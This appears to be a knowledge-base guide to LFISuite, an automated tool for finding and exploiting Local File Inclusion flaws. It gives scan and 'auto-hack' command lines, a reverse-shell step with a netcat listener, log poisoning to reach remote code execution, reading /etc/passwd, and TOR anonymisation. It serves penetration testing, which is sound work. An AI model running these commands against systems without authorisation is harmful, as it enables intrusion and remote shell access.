---
icon: file-circle-plus
---

# LFISuite

## The LFISuite Masterclass: Professional Local File Inclusion (LFI) Testing

LFISuite is a powerful, automated tool designed for detecting and exploiting Local File Inclusion vulnerabilities. It supports multiple attack vectors, proxy integration, and reverse shell capabilities, making it a valuable asset for penetration testers and security professionals.

***

### I. Environment Setup: Dynamic Variables

Export variables to enable flexible, repeatable scanning workflows:

```bash
export URL="<http://target.com/index.php?page=home.html>"
export PARAM="page"
export COOKIE="SESSION=abcd1234; other=xyz"
export USER_AGENT="Mozilla/5.0 (LFISuite)"
export PROXY="<http://127.0.0.1:8080>"
export OUTPUT_DIR="lfisuite-results"
export THREADS=10
```

***

### II. Core Capabilities & Workflow

* **Automated LFI Scanning:** Scans target URLs for LFI vulnerabilities using multiple attack methods such as `/proc/self/environ`, `php://filter`, `php://input`, `/proc/self/fd`, access logs, `phpinfo()`, `data://`, and `expect://`.
* **Auto-Hack Mode:** Sequentially tries all attack vectors automatically for comprehensive exploitation.
* **Reverse Shell Support:** Provides reverse shell payloads for Linux, Windows, and macOS after successful exploitation.
* **Proxy & Header Support:** Integrates with TOR or custom proxies and supports custom headers like cookies and user-agent.
* **Multi-Platform:** Compatible with Windows, Linux, and macOS.

***

### III. Professional Usage Examples

#### 1. Scan for LFI Vulnerabilities

```bash
python3 [lfisuite.py](<http://lfisuite.py>) -u "$URL" -p "$PARAM" --cookie "$COOKIE" --user-agent "$USER_AGENT"
```

#### 2. Use Proxy (e.g., Burp Suite or TOR)

```bash
python3 [lfisuite.py](<http://lfisuite.py>) -u "$URL" -p "$PARAM" --proxy "$PROXY" --cookie "$COOKIE"
```

#### 3. Auto-Hack Mode (Full Automated Exploitation)

```bash
python3 [lfisuite.py](<http://lfisuite.py>) -u "$URL" -p "$PARAM" --auto-hack
```

#### 4. Obtain Reverse Shell

After successful LFI exploitation, run in LFISuite:

```bash
reverseshell
```

Then listen on your machine, for example:

```bash
nc -lvp 4444
```

#### 5. Scan Multiple Parameters

Specify multiple parameters separated by commas:

```bash
python3 [lfisuite.py](<http://lfisuite.py>) -u "$URL" -p "page,lang,template" --cookie "$COOKIE"
```

***

### IV. Advanced Techniques & Scenarios

* **Payload Customization:** Modify or add payloads to test uncommon LFI vectors.
* **Log Poisoning Exploits:** Use access log or error log inclusion to escalate to remote code execution.
* **Blind LFI Detection:** Use timing or out-of-band techniques to detect non-reflected inclusions.
* **TOR Integration:** Route scans through TOR for anonymity.
* **Multi-threading:** Speed up scans with the `-threads` option.

***

### V. Real-World Workflow Example

1. Export Variables:

```bash
export URL="<http://vulnerable.site/index.php?file=home.html>"
export PARAM="file"
export COOKIE="SESSION=xyz"
export OUTPUT_DIR="lfisuite_scans"
```

2. Run Scanner:

```bash
python3 [lfisuite.py](<http://lfisuite.py>) -u "$URL" -p "$PARAM" --cookie "$COOKIE" --output "$OUTPUT_DIR/scan.txt"
```

3. Analyze Results:

Review output for successful file inclusions such as `/etc/passwd` or application config files.

4. Exploit with Auto-Hack:

```bash
python3 [lfisuite.py](<http://lfisuite.py>) -u "$URL" -p "$PARAM" --auto-hack
```

5. Get Reverse Shell:

```bash
reverseshell
```

Then listen locally with `nc -lvp 4444`.

***

### VI. Pro Tips & Best Practices

* Always scan targets with explicit permission.
* Use TOR or proxies to anonymize scans when appropriate.
* Combine LFISuite with manual testing and other tools (e.g., Burp Suite) for comprehensive coverage.
* Document all findings and save outputs for reporting.
* Test multiple parameters and payloads to maximize detection.
* Use log poisoning techniques to escalate from LFI to RCE.

***

This professional LFISuite guide equips you for thorough, automated, and stealthy LFI detection and exploitation in real-world penetration testing engagements.

1. [https://www.linkedin.com/pulse/ethical-hacking-beginner-learn-lfi-exploitation-lfisuite-rajib-bepari-qqv2f](https://www.linkedin.com/pulse/ethical-hacking-beginner-learn-lfi-exploitation-lfisuite-rajib-bepari-qqv2f)
2. [https://linuxsecurity.expert/tools/lfi-suite/](https://linuxsecurity.expert/tools/lfi-suite/)
3. [https://github.com/D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite)
4. [https://www.cobalt.io/blog/a-pentesters-guide-to-file-inclusion](https://www.cobalt.io/blog/a-pentesters-guide-to-file-inclusion)
5. [https://www.briskinfosec.com/tooloftheday/toolofthedaydetail/LFISuite](https://www.briskinfosec.com/tooloftheday/toolofthedaydetail/LFISuite)
6. [https://www.hackingarticles.in/comprehensive-guide-to-local-file-inclusion/](https://www.hackingarticles.in/comprehensive-guide-to-local-file-inclusion/)
7. [https://owasp.org/www-project-web-security-testing-guide/v42/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/11.1-Testing\_for\_Local\_File\_Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
